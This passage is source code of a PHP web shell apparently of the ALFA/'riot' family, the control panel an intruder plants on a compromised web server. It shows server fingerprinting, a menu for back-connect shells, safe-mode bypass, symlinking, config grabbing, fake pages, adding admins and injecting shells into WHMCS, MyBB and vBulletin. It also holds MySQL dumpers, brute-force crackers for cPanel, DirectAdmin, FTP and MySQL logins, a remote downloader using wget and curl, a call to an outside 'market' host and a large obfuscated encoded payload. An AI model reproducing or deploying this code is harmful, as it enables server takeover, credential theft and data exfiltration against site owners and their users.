0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __ALFA_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=riot_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+riotb64("cgishell")+"&riot1="+riotb64(e)+"&ajax="+riotb64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
</script>
<?php
echo "<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
<input type='hidden' name='a' value='dlfile'>
<input type='hidden' name='c' value=''>
<input type='hidden' name='file' value=''>
</form>
<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
<div id='a_loader'><img src='" .
    __showicon("loader") .
    "'></div>";
$cmd_uname = riotEx("uname -a", false, false);
$uname = function_exists("php_uname") ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname) > 0 ? $cmd_uname : "( php_uname ) Function Disabled !");
if ($uname == "( php_uname ) Function Disabled !") {
    $GLOBALS["need_to_update_header"] = "true";
}
echo '
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div id="up_bar_holder"></div>
<div class="whole">
<form method="post" name="mf" style="display:none;">
<input type="hidden" name="a">
<input type="hidden" name="c" value="' .
    $GLOBALS["cwd"] .
    '">';
for ($s = 1; $s <= 10; $s++) {
    echo '<input type="hidden" name="riot' . $s . '">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><span style="color:#42ff59;">' .
    '</span></small></a></div>
<div class="header"><table width="100%" border="0">
<tr>
<td width="3%"><span class="header_vars">Uname:</span></td>
<td colspan="2"><span class="header_values" id="header_uname">' .
    $uname .
    '</span></td>
</tr>
<tr>
<td><span class="header_vars">User:</span></td>
<td><span class="header_values" id="header_userid">' .
    $uid .
    " [ " .
    $user .
    ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' .
    $gid .
    " [ " .
    $group .
    ' ]</span> </td>
</tr>
<tr>
<td><span class="header_vars">PHP:</span></td>
<td><b>' .
    @phpversion() .
    ' </b><span class="header_vars"> Safe Mode: ' .
    $safe_modes .
    '</span></td>
</tr>
<tr>
<td><span class="header_vars">ServerIP:</span></td>
<td><b>' .
    (!@$_SERVER["SERVER_ADDR"] ? (function_exists("gethostbyname") ? @gethostbyname($_SERVER["SERVER_NAME"]) : "????") : @$_SERVER["SERVER_ADDR"]) .
    '</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> ' .
    @$_SERVER["REMOTE_ADDR"] .
    '</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
</tr>
<tr>
<td width="3%"><span class="header_vars">DateTime:</span></td>
<td colspan="2"><b>' .
    date("Y-m-d H:i:s") .
    '</b></td>
</tr>
<tr>
<td><span class="header_vars">Domains:</span></td>
<td width="76%"><span class="header_values" id="header_domains">';
if ($GLOBALS["sys"] == "unix") {
    $d0mains = _riot_file("/etc/named.conf", false);
    if (!$d0mains) {
        echo "Cant Read [ /etc/named.conf ]";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        echo "$count Domains";
    }
} else {
    echo "Cant Read [ /etc/named.conf ]";
}
echo '</span></td>
</tr>
<tr>
<td height="16"><span class="header_vars">HDD:</span></td>
<td><span class="header_vars">Total:</span><b>' .
    riotSize($totalSpace) .
    ' </b><span class="header_vars">Free:</span><b>' .
    riotSize($freeSpace) .
    " [" .
    (int) (($freeSpace / $totalSpace) * 100) .
    '%]</b></td>
</tr>';
if ($GLOBALS["sys"] == "unix") {
    $useful_downloader =
        '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
    if (!@ini_get("safe_mode")) {
        if (strlen(riotEx("id", false, false)) > 0) {
            echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
            $userful = ["gcc", "lcc", "cc", "ld", "make", "php", "perl", "python", "ruby", "tar", "gzip", "bzip", "bziriot2", "nc", "locate", "suidperl"];
            $x = 0;
            foreach ($userful as $item) {
                if (riotWhich($item)) {
                    $x++;
                    echo '<span class="header_values" style="margin-left: 4px;">' . $item . "</span>";
                }
            }
            if ($x == 0) {
                echo "<span class='header_values' id='header_useful'>--------------</span>";
                $GLOBALS["need_to_update_header"] = "true";
            }
            echo '</td>
</tr>
<tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
            $downloaders = ["wget", "fetch", "lynx", "links", "curl", "get", "lwp-mirror"];
            $x = 0;
            foreach ($downloaders as $item2) {
                if (riotWhich($item2)) {
                    $x++;
                    echo '<span class="header_values" style="margin-left: 4px;">' . $item2 . "</span>";
                }
            }
            if ($x == 0) {
                echo "<span class='header_values' id='header_downloader'>--------------</span>";
                $GLOBALS["need_to_update_header"] = "true";
            }
            echo '</td>
</tr>';
        } else {
            echo $useful_downloader;
            $GLOBALS["need_to_update_header"] = "true";
        }
    } else {
        echo $useful_downloader;
        $GLOBALS["need_to_update_header"] = "true";
    }
} else {
    echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
    echo riotEx("ver", false, false);
    echo '</td>
</tr> <tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
</tr></b>';
}
$quotes = function_exists("get_magic_quotes_gpc") ? get_magic_quotes_gpc() : "0";
if ($quotes == "1" or $quotes == "on") {
    $magic = '<b><span class="header_on">ON</span>';
} else {
    $magic = '<span class="header_off">OFF</span>';
}
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>' .
    Alfa_GetDisable_Function() .
    '</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>' .
    $curl .
    ' | <span class="header_vars">SSH2 : </span>' .
    $ssh2 .
    ' | <span class="header_vars">Magic Quotes : </span>' .
    $magic .
    ' | <span class="header_vars"> MySQL :</span>' .
    $mysql .
    ' | <span class="header_vars">MSSQL :</span>' .
    $mssql .
    ' | <span class="header_vars"> PostgreSQL :</span>' .
    $pg .
    ' | <span class="header_vars"> Oracle :</span>' .
    $or .
    " " .
    ($GLOBALS["sys"] == "unix" ? '| <span class="header_vars"> CGI :</span> ' . $cgi_shell : "") .
    '
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>' .
    $open_b .
    '</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>' .
    $safe_exe .
    '</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>' .
    $safe_include .
    '</b></td>
</tr>
<tr>
<td height="11"><span class="header_vars">SoftWare: </span></td>
<td colspan="2"><b>' .
    @getenv("SERVER_SOFTWARE") .
    '</b></td>
</tr>';
if ($GLOBALS["sys"] == "win") {
    echo '<tr>
<td height="12"><span class="header_vars">DRIVE:</span></td>
<td colspan="2"><b>' .
        $drives .
        '</b></td>
</tr>';
}
echo '<tr>
<td height="12"><span class="header_vars">PWD:</span></td>
<td colspan="2"><span id="header_cwd">' .
    $cwd_links .
    ' </span><a href="#action=fileman&path=' .
    $GLOBALS["home_cwd"] .
    '" onclick="g(\'FilesMan\',\'' .
    $GLOBALS["home_cwd"] .
    '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>
';
$li = [
    "proc" => "PROCESS",
    "sql" => "SQL MANAGER",
    "dumper" => "DATABASE DUMPER",
    "coldumper" => "COLUMN DUMPER",
    "hash" => "EN-DECODER",
    "connect" => "BACK CONNECT",
    "safe" => "BYPASSER",
    "cgishell" => "CGI SHELL",
    "portscanner" => "PORT SCANNER",
    "basedir" => "OPEN BASEDIR",
    "ziper" => "COMPRESSOR",
    "deziper" => "DECOMPRESSOR",
    "pwchanger" => "ADD NEW ADMIN",
    "ShellInjectors" => "SHELL INJECTORS",
    "Whmcs" => "WHMCS DECODER",
    "symlink" => "SYMLINK",
    "searcher" => "SEARCHER",
    "config_grabber" => "CONFIG GRABBER",
    "fakepage" => "FAKE PAGE",
    "archive_manager" => "ARCHIVE MANAGER",
];
foreach ($li as $key => $value) {
    echo '<li><a id="menu_opt_' .
        $key .
        '" href="#action=options&path=' .
        $GLOBALS["cwd"] .
        "&opt=" .
        $key .
        '" class="menu_options" onclick="riot_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=' .
        $key .
        '\';g(\'' .
        $key .
        '\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">' .
        $value .
        "</a></li>" .
        "\n";
}
echo '</ul>' .
    (!empty($_COOKIE["AlfaUser"]) && !empty($_COOKIE["AlfaPass"]) ? '<a href="javascript:void(0);" onclick="riotLogOut();"><font color="red">LogOut</font></a>' : "") .
    '</div></div><div id="filesman_tabs"><div onmouseover="riotFilesmanTabShowTitle(this,event);" onmouseout="riotFilesmanTabHideTitle(this,event);" fm_counter="1" path="' .
    $GLOBALS["cwd"] .
    '" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="https://dev.artikelspiner.id/icon/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: #7502FF;" onClick="riotFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';

    } else {
        @error_reporting(E_ALL ^ E_NOTICE);
        @ini_set("error_log", null);
        @ini_set("log_errors", 0);
        @ini_set("max_execution_time", 0);
        @ini_set("magic_quotes_runtime", 0);
        @set_time_limit(0);
    }
}
function showAnimation($name)
{
    return "-webkit-animation: " . $name . " 800ms ease-in-out forwards;-moz-animation: " . $name . " 800ms ease-in-out forwards;-ms-animation: " . $name . " 800ms ease-in-out forwards;animation: " . $name . " 800ms ease-in-out forwards;";
}
function __showicon($r)
{
    $s["btn"] = "https://icons.iconarchive.com/icons/hopstarter/button/256/Button-Next-icon.png";
    $s["riotmini"] = "https://cdn-icons-png.flaticon.com/512/4773/4773868.png";
    $s["loader"] = "https://png.pngtree.com/png-vector/20231213/ourmid/pngtree-technology-border-blue-circle-sci-fi-ai-element-three-dimensional-buckle-png-image_11330449.png";
    //return 'data:image/png;base64,'.__get_resource($s[$r]);
    return $s[$r];
}
function __download($url, $path = false)
{
    if (!preg_match("/[a-z]+:\/\/.+/", $url)) {
        return false;
    }
    $saveas = basename(rawurldecode($url));
    if ($path) {
        $saveas = $path . $saveas;
    }
    if ($content = __read_file($url)) {
        if (@is_file($saveas)) {
            @unlink($saveas);
        }
        if (__write_file($saveas, $content)) {
            return true;
        }
    }
    $buff = riotEx("wget " . $url . " -O " . $saveas);
    if (@is_file($saveas)) {
        return true;
    }
    $buff = riotEx("curl " . $url . " -o " . $saveas);
    if (@is_file($saveas)) {
        return true;
    }
    $buff = riotEx("lwp-download " . $url . " " . $saveas);
    if (@is_file($saveas)) {
        return true;
    }
    $buff = riotEx("lynx -source " . $url . " > " . $saveas);
    if (@is_file($saveas)) {
        return true;
    }
    $buff = riotEx("GET " . $url . " > " . $saveas);
    if (@is_file($saveas)) {
        return true;
    }
    $buff = riotEx("links -source " . $url . " > " . $saveas);
    if (@is_file($saveas)) {
        return true;
    }
    $buff = riotEx("fetch -o " . $saveas . " -p " . $url);
    if (@is_file($saveas)) {
        return true;
    }
    return false;
}
function clean_string($string)
{
    if (function_exists("iconv")) {
        $s = trim($string);
        $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
    }
    return $s;
}
function __read_file($file, $boom = true)
{
    $content = false;
    if ($fh = @fopen($file, "rb")) {
        $content = "";
        while (!feof($fh)) {
            $content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
        }
        @fclose($fh);
    }
    if (empty($content) || !$content) {
        $content = riotEx("cat '" . addslashes($file) . "'");
    }
    return $content;
}
function riotMarket()
{
    echo "<div class='header'>";
    $curl = new AlfaCURL();
    $content = $curl->Send("http://riotexec.com/market.php");
    $data = @json_decode($content, true);
    if (!empty($data)) {
        if ($data["status"] == "open") {
            echo $data["content"];
        } else {
            echo $data["error_msg"];
        }
    } else {
        echo "<div style='text-align:center;font-size:20px;'>Cant connect to the riot market....! try later.</div>";
    }
    echo "</div>";
}
$R10T = "==wiNW\x42zT\x63Ij\x41p9fw6hZ5pR\x61Lgf2v+H\x64YuhNM\x64L\x443zhoSK+quv\x43M\x41jGhK\x44\x423\x61hHSR\x43SuSzSVq+JM2z7/\x43W5Lf6v4jy8oZfkiUhYlF7vqqEx7YSfF\x42Gz8\x644Es5kjtHspHHzUeJt/Wh\x6116\x43iSZuX\x63m\x439m\x640\x41qOxuzMpON8JLOhWEg2\x64g\x419k\x41P6Tx61yF5wMF9\x62\x44UqUZOPzKn\x62U/t6ryhsk0WrI0E4qWm5\x61MP8vMlv10\x43\x44FY1\x62z\x43\x44KP4T\x41Pqe5/Vqo4h\x42QeeryrgNMrlNX1\x645\x42p3hH7umHUJRR3Xl9L+EyNXsn99qnLSuQz8\x42vEEhMmX/\x43u4\x41e6LzVxEisL+Q94r4kFtZVho\x41PQ962Yp4/VujUg\x41jwXxHElPR\x42\x63j\x445FLk\x41\x438NPzrrJ6U29+9LoSf/Jy/2/kfzelV4//\x42qF+rRU1nwrkU1ThhOOhQ\x62fOg99jXfu9xqyJZi55z5if5\x41pMXw\x436e1mQ\x64HVQjIft\x62\x63Tm\x417L\x42s\x63\x42y0Fh\x641+ks67MGVPvVOK\x640zgZugw1ykZ\x62EHxYy0JM9TlTs7Ww\x61\x64mTs\x64L7xj\x64\x64ny4\x44v2r1G9YsK\x42Z\x647f36\x41Y1W\x61+9FoV7zYpgmP\x44L\x61PQPg\x42MkS0h/85\x42W8\x43jstZwxEqTo\x622YQGHsN\x62\x449yosJp\x41fQKZQ8hQ6h\x43iR6gJn\x6325xt9\x41npr7FYOOfPrOmj1FgxR8nSviU9L87\x62e0\x6179mRrv12Z0Go6M\x6425i3wLYvzG\x62u2Xoexx\x63\x61Ielle8TgHHwzZYOPqSSikW\x43SS54K\x420HMnl\x43xJFM9w+lHs\x64trvRx0tt\x64g6E\x62T\x440E\x64y20M7+xq3qP0\x64jvhHY+nE394LO\x633\x62Ox0nXP6e9NW\x442QfY\x61\x43\x41Y\x42twemxj\x62WxH\x41ZnL8\x62f7nM\x42Sqz\x42ywQjLP6sGLy\x64\x64Ft\x43WqJNj1FyrhNvr21\x43Y8Ui7jKRZFG0s+f6\x6212f2MZyMz6\x62NW/kgWIYzOZ\x429nv+/UunnefJkfrG7txu3F\x4316\x64N2KZoRRiM\x42VoU0eqiMgQYo\x41\x61\x41RqToqFm/R5j9\x42\x42Q\x62702U1Y/eIQ4\x42wJe9Ph\x41sHQ/OIQ8\x42wJe9Pg\x418H\x41/+PQ\x41\x42wJe8P/\x41ME\x41/uPQE\x42wJe";
function riotcoldumper()
{
    riothead();
    echo '<div class="header">';
    AlfaNum(8, 9, 10);
    echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>" .
        getConfigHtml("all") .
        "<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
    $delimiter = !empty($_POST["riot1"]) ? $_POST["riot1"] : "::";
    $selected_data = json_decode($_POST["riot2"], true);
    $username = $_POST["riot3"];
    $password = $_POST["riot4"];
    $dbname = $_POST["riot5"];
    $dfile = $_POST["riot6"];
    $host = $_POST["riot7"];
    $table = [
        "td1" => [
            "color" => "FFFFFF",
            "tdName" => "db_host : ",
            "inputName" => "db_host",
            "id" => "db_host",
            "inputValue" => $host,
            "inputSize" => "50",
        ],
        "td2" => [
            "color" => "FFFFFF",
            "tdName" => "db_username : ",
            "inputName" => "db_username",
            "id" => "db_user",
            "inputValue" => $username,
            "inputSize" => "50",
        ],
        "td3" => [
            "color" => "FFFFFF",
            "tdName" => "db_password : ",
            "inputName" => "db_password",
            "id" => "db_pw",
            "inputValue" => $password,
            "inputSize" => "50",
        ],
        "td4" => [
            "color" => "FFFFFF",
            "tdName" => "db_name : ",
            "inputName" => "db_name",
            "id" => "db_name",
            "inputValue" => $dbname,
            "inputSize" => "50",
        ],
        "td5" => [
            "color" => "FFFFFF",
            "tdName" => "Output Path: ",
            "inputName" => "dfile",
            "inputValue" => htmlspecialchars($GLOBALS["cwd"]),
            "inputSize" => "50",
        ],
    ];
    create_table($table);
    echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
    $db = false;
    if (!empty($dbname)) {
        $db = @mysqli_connect($host, $username, $password, $dbname);
    }
    if (count($selected_data) > 0) {
        if ($db) {
            if (!is_dir($dfile)) {
                $dfile = $GLOBALS["cwd"];
            }
            $tbls = "";
            $ext = ".txt";
            if ($delimiter == "json") {
                $ext = ".json";
            }
            foreach ($selected_data as $tbl => $cols) {
                $tables_query = mysqli_query($db, "SELECT " . implode(",", $cols) . " FROM $tbl");
                $file_name = $dfile . "/" . $dbname . "." . $tbl . $ext;
                $fp = fopen($file_name, "w");
                $data = [];
                while ($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)) {
                    if ($delimiter == "json") {
                        $col_arr = [];
                        foreach ($row as $key => $value) {
                            if (empty($value)) {
                                $value = "[empty]";
                            }
                            $col_arr[$key] = $value;
                        }
                        $data[$tbl][] = $col_arr;
                    } else {
                        $data = "";
                        foreach ($row as $key => $value) {
                            if (empty($value)) {
                                $value = "[empty]";
                            }
                            $data .= $value . $delimiter;
                        }
                        fwrite($fp, $data . "\n");
                    }
                }
                if ($delimiter == "json") {
                    fwrite($fp, json_encode($data));
                }
                fclose($fp);
                $tbls .= "Done ~~~> " . $file_name . "<br>";
            }
            echo __pre();
            echo "<center><font color='#7502FF'>" . $tbls . "</font></center>";
        }
    }
    if (!empty($dbname) && count($selected_data) == 0) {
        //echo __pre();
        if ($db) {
            echo "<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>";
            echo "<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>";
            $data = [];
            $tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
            while ($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)) {
                $data[$row["table_name"]] = [];
                $table_count_q = mysqli_query($db, "SELECT count(*) FROM `" . $row["table_name"] . "`");
                $table_count = mysqli_fetch_row($table_count_q);
                $data[$row["table_name"]]["data_count"] = $table_count[0];
                $columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '" . $row["table_name"] . "'");
                while ($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)) {
                    $data[$row["table_name"]]["cols"][] = $row2["column_name"];
                }
            }
            mysqli_close($db);

            echo '<ul id="myUL">';
            foreach ($data as $tbl => $cols) {
                echo '<li><span style="color:#7502FF;" class="box">' . $tbl . " (" . $cols["data_count"] . ')</span><ul class="nested">';
                foreach ($cols["cols"] as $col) {
                    echo '<li tbl="' . $tbl . '"><span style="color:#7502FF;" tbl="' . $tbl . '" class="box sub-box">' . $col . "</span></li>";
                }
                echo "</ul></li>";
            }
            echo "</ul>";
        } else {
            echo "<center>mysqli_connect : Error!</center>";
        }
    }
    echo "</div>";
    riotfooter();
}
function riotDumper()
{
    riothead();
    echo '<div class="header">';
    AlfaNum(8, 9, 10);
    echo "<center><br><div class='txtfont_header'>| Mysql Database Dumper |</div><br><br>" .
        getConfigHtml("all") .
        "<form method='post' onsubmit=\"g('dumper',null,null,null,this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); return false;\"><p>";
    $table = [
        "td1" => [
            "color" => "FFFFFF",
            "tdName" => "db_host : ",
            "inputName" => "db_host",
            "id" => "db_host",
            "inputValue" => "localhost",
            "inputSize" => "50",
        ],
        "td2" => [
            "color" => "FFFFFF",
            "tdName" => "db_username : ",
            "inputName" => "db_username",
            "id" => "db_user",
            "inputValue" => "",
            "inputSize" => "50",
        ],
        "td3" => [
            "color" => "FFFFFF",
            "tdName" => "db_password : ",
            "inputName" => "db_password",
            "id" => "db_pw",
            "inputValue" => "",
            "inputSize" => "50",
        ],
        "td4" => [
            "color" => "FFFFFF",
            "tdName" => "db_name : ",
            "inputName" => "db_name",
            "id" => "db_name",
            "inputValue" => "",
            "inputSize" => "50",
        ],
        "td5" => [
            "color" => "FFFFFF",
            "tdName" => "Dump Path: ",
            "inputName" => "dfile",
            "inputValue" => htmlspecialchars($GLOBALS["cwd"]) . "riot.sql",
            "inputSize" => "50",
        ],
    ];
    create_table($table);
    echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
    $username = $_POST["riot3"];
    $password = $_POST["riot4"];
    $dbname = $_POST["riot5"];
    $dfile = $_POST["riot6"];
    $host = $_POST["riot7"];
    if (!empty($dbname)) {
        echo __pre();
        $msg = "<center>Check this :  <font color='red'>" . $dfile . "</font></center>";
        if (@mysqli_connect($host, $username, $password, $dbname)) {
            if (strlen(riotEx("mysqldump")) > 0) {
                riotEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '" . addslashes($dfile) . "'");
                echo $msg;
            } else {
                __alert("Error...!");
            }
        } else {
            echo "<center>mysqli_connect : Error!</center>";
        }
    }
    echo "</div>";
    riotfooter();
}
function Alfa_DirectAdmin_Cracker($info)
{
    if (!$info["mysql"]) {
        $url = $info["protocol"] . $info["target"] . ":" . $info["port"] . "/CMD_LOGIN";
    } else {
        $url = $info["protocol"] . $info["target"] . "/phpmyadmin";
    }
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERPWD, $info["username"] . ":" . $info["password"]);
    if ($info["mysql"]) {
        curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
    }
    $result = @curl_exec($curl);
    $curl_errno = curl_errno($curl);
    $curl_error = curl_error($curl);
    if ($curl_errno > 0) {
        echo "<font color='red'>Error: $curl_error</font><br>";
    } elseif (preg_match("/CMD_FILE_MANAGER|frameset/i", $result)) {
        echo 'UserName: <font color="red">' . $info["username"] . '</font> PassWord: <font color="red">' . $info["password"] . '</font><font color="red">  Login Success....</font><br>';
        $info["target"] = $url;
        CrackerResualt($info);
    }
    curl_close($curl);
}
function Alfa_CP_Cracker($info)
{
    $url = $info["protocol"] . $info["target"] . ":" . $info["port"];
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_HTTPHEADER, ["Authorization: Basic " . __ZW5jb2Rlcg($info["username"] . ":" . $info["password"]) . "\n\r"]);
    curl_setopt($curl, CURLOPT_URL, $url);
    $result = @curl_exec($curl);
    $curl_errno = curl_errno($curl);
    $curl_error = curl_error($curl);
    if ($curl_errno > 0) {
        echo "<font color='red'>Error: $curl_error</font><br>";
    } elseif (preg_match("/filemanager/i", $result)) {
        echo 'UserName: <font color="red">' . $info["username"] . '</font> PassWord: <font color="red">' . $info["password"] . '</font><font color="red">  Login Success....</font><br>';
        $info["target"] = $url;
        CrackerResualt($info);
    }
    curl_close($curl);
}
function Alfa_FTP_Cracker($info)
{
    $url = $info["protocol"] . $info["target"];
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_USERPWD, "" . $info["username"] . ":" . $info["password"] . "");
    $result = @curl_exec($curl);
    $curl_errno = curl_errno($curl);
    $curl_error = curl_error($curl);
    if ($curl_errno > 0) {
        echo "<font color='red'>Error: $curl_error</font><br>";
    } elseif (preg_match("/(\d+):(\d+)/i", $result)) {
        echo 'UserName: <font color="red">' . $info["username"] . '</font> PassWord: <font color="red">' . $info["password"] . '</font><font color="red">  Login Success....</font><br>';
        $info["target"] = $url;
        CrackerResualt($info);
    }
    curl_close($curl);
}
function Alfa_Mysql_Cracker($info)
{
    if (@mysqli_connect($info["target"] . ":" . $info["port"], $info["username"], $info["password"])) {
        CrackerResualt($info);
        echo 'UserName: <font color="red">' . $info["username"] . '</font> PassWord: <font color="red">' . $info["password"] . '</font><font color="red">  Login Success....</font><br>';
    }
}
function Alfa_FTPC($info)
{
    if ($con = @ftp_connect($info["target"], $info["port"])) {
        if ($con) {
            $login = @ftp_login($con, $info["username"], $info["password"]);
            if ($login) {
                CrackerResualt($info);
            }
        }
    }
    @ftp_close($con);
}
function CrackerResualt($info)
{
    $res = $info["target"] . " => " . $info["username"] . ":" . $info["password"] . "\n";
    $c = @fopen($info["fcrack"], "a+");
    @fwrite($c, $res);
    @fclose($c);
}
function Alfa_Call_Function_Cracker($method, $info)
{
    switch ($method) {
        case "cp":
            return Alfa_CP_Cracker($info);
            break;
        case "direct":
        case "phpmyadmin":
            return Alfa_DirectAdmin_Cracker($info);
            break;
        case "ftp":
            return Alfa_FTP_Cracker($info);
            break;
        case "mysql":
            return Alfa_Mysql_Cracker($info);
            break;
        case "mysql":
            return Alfa_FTPC($info);
            break;
    }
}
function output($string)
{
    echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='" . $string . "'>Click Here !</a></font></b></center><br><br>";
}
function riotShellInjectors()
{
    riothead();
    echo "<div class=header>";
    AlfaNum(11);
    echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
    $selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
    if (isset($_POST["riot1"]) && $_POST["riot1"] == "whmcs") {
        AlfaNum();
        echo __pre() .
